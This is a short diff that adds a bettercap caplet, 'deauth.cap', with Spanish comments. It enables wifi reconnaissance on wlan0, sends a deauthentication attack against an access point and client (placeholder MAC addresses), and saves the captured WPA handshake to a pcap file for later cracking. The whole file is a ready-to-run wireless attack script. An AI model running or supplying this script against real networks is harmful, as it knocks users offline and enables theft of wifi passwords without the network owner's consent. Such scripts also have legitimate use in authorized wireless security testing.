@@ -1,0 +1,15 @@
+# deauth.cap
+set wifi.interface wlan0
+# detener recon si está corriendo y luego configurar archivo de handshakes
+wifi.recon off
+set wifi.handshakes.file /tmp/handshakes/mi_handshake.pcap
+# opcional: crear carpeta
+!mkdir -p /tmp/handshakes
+# Habilitar recon (con channel hopping por defecto)
+wifi.recon on
+# Ejecutar desauth al AP y al cliente
+wifi.deauth DE:AD:BE:EF:DE:AD 11:22:33:44:55:66
+# esperar 15s para capturar
+sleep 15
+# detener recon
+wifi.recon off
